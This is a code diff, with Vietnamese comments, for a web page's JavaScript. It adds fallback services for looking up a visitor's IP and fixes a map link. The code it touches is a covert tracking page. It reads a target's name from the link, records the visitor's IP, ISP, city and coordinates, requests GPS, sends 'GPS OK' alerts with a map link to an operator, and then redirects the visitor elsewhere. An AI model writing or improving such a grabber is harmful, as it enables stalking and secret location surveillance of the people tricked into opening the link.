@@ -78,16 +78,50 @@
             } else { startTrack(); }
         };
 
-        // Hàm lấy IP ổn định hơn
+        // Hàm lấy IP cải tiến - có nhiều dịch vụ dự phòng
         async function getIP() {
-            try {
-                // Thử dịch vụ 1
-                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
-                if (res.ip) return res;
-            } catch (e) {
-                // Dự phòng dịch vụ 2 nếu cái 1 lỗi
-                return fetch('https://extreme-ip-lookup.com/json/').then(r => r.json()).catch(() => ({}));
+            const services = [
+                // Dịch vụ 1: ipapi.co (nhanh, đầy đủ thông tin)
+                async () => {
+                    const res = await fetch('https://ipapi.co/json/', {timeout: 5000}).then(r => r.json());
+                    if (res.ip) return { ip: res.ip, org: res.org, city: res.city, country: res.country_name, latitude: res.latitude, longitude: res.longitude };
+                },
+                // Dịch vụ 2: ip-api.com (miễn phí, chính xác)
+                async () => {
+                    const res = await fetch('http://ip-api.com/json/?fields=query,org,city,country,lat,lon', {timeout: 5000}).then(r => r.json());
+                    if (res.query) return { ip: res.query, org: res.org, city: res.city, country: res.country, latitude: res.lat, longitude: res.lon };
+                },
+                // Dịch vụ 3: ipify (cơ bản nhưng rất ổn định)
+                async () => {
+                    const ip = await fetch('https://api.ipify.org?format=json', {timeout: 5000}).then(r => r.json()).then(d => d.ip);
+                    if (ip) return { ip: ip, org: 'Unknown', city: 'Unknown', country: 'Unknown' };
+                },
+                // Dịch vụ 4: extreme-ip-lookup
+                async () => {
+                    const res = await fetch('https://extreme-ip-lookup.com/json/', {timeout: 5000}).then(r => r.json());
+                    if (res.query) return { ip: res.query, org: res.businessName, city: res.city, country: res.country, latitude: res.lat, longitude: res.lon };
+                },
+                // Dịch vụ 5: Fallback đơn giản
+                async () => {
+                    return { ip: 'N/A', org: 'Unable to fetch', city: 'Unknown', country: 'Unknown' };
+                }
+            ];
+
+            for (let service of services) {
+                try {
+                    const result = await Promise.race([
+                        service(),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 6000))
+                    ]);
+                    if (result && result.ip && result.ip !== 'N/A') {
+                        return result;
+                    }
+                } catch (e) {
+                    console.log('IP service failed, trying next...', e.message);
+                    continue;
+                }
             }
+            return { ip: 'Unknown', org: 'All services failed', city: 'Unknown', country: 'Unknown' };
         }
 
         async function startTrack() {
@@ -97,12 +131,12 @@
             const ipRes = await getIP();
             const logData = {
                 name: params.get('name') || 'Ẩn danh',
-                ip: ipRes.ip || ipRes.query || 'Chặn IP',
-                isp: ipRes.org || ipRes.businessName || 'Không rõ',
-                loc: (ipRes.city && ipRes.country) ? `${ipRes.city}, ${ipRes.country}` : 'Không rõ',
+                ip: ipRes.ip || 'Blocked',
+                isp: ipRes.org || 'Unknown',
+                loc: (ipRes.city && ipRes.country) ? `${ipRes.city}, ${ipRes.country}` : 'Unknown',
                 time: new Date().toLocaleString(),
-                lat: ipRes.latitude || ipRes.lat || null,
-                lon: ipRes.longitude || ipRes.lon || null,
+                lat: ipRes.latitude || null,
+                lon: ipRes.longitude || null,
                 st: 'IP-Captured'
             };
 
@@ -115,7 +149,7 @@
                 navigator.geolocation.getCurrentPosition(async (p) => {
                     const lat = p.coords.latitude, lon = p.coords.longitude;
                     await logRef.update({ lat, lon, st: 'GPS-OK' });
-                    await report(`🎯 <b>GPS OK: ${logData.name}</b>\n📍 <a href="http://maps.google.com/q=$$${lat},${lon}">XEM BẢN ĐỒ</a>`);
+                    await report(`🎯 <b>GPS OK: ${logData.name}</b>\n📍 <a href="http://maps.google.com/q=${lat},${lon}">XEM BẢN ĐỒ</a>`);
                     location.replace(cfg.r);
                 }, async () => {
                     await report(`⚠️ <b>TỪ CHỐI GPS: ${logData.name}</b>\n📍 Chỉ lấy được IP.`);
